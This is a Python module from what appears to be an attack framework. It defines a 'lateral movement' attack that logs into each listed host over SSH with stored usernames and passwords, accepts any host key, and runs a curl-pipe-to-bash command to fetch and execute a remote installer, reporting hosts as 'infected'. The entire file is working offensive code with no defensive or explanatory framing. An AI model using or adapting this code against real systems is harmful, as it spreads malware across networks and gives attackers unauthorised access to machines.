import paramiko
import logging

from attacks import Attack, AttackNumberParameter
from settings import LATERAL_TARGETS, INSTALLER_URL

logger = logging.getLogger("lateral")

class LateralMovementAttack(Attack):
    def __init__(self):
        super().__init__('lateral_movement', 'Lateral Movement', 'Infects target on other subnets via SSH', [])

    async def run(self):
        logger.info("[*] Starting lateral movement attack")
        try:
            lateral_move_all()
        except Exception as e:
            logger.exception("Lateral movement attack failed")
        finally:
            logger.info("[*] Lateral movement attack finished")

def lateral_move_all():
    for tgt in LATERAL_TARGETS:
        lateral_move_one(tgt)

def lateral_move_one(target):
        host = target["host"]
        user = target["user"]
        pwd  = target["password"]

        logger.info(f"[*] Trying to infect {host} via SSH")

        try:
            # 1) SSH connect
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=user, password=pwd, timeout=10)

            # 2) Build the one‚Äêliner that fetches+runs the installer
            cmd = f"curl -fsSL {INSTALLER_URL} | bash"
            stdin, stdout, stderr = ssh.exec_command(cmd)

            # 3) Wait and log results
            exit_status = stdout.channel.recv_exit_status()
            if exit_status == 0:
                logger.info(f"[+] Successfully infected {host}")
            else:
                err = stderr.read().decode()
                logger.error(f"[-] Installer failed on {host}: {err}")

        except Exception as e:
            logger.exception(f"SSH to {host} failed")
        finally:
            ssh.close()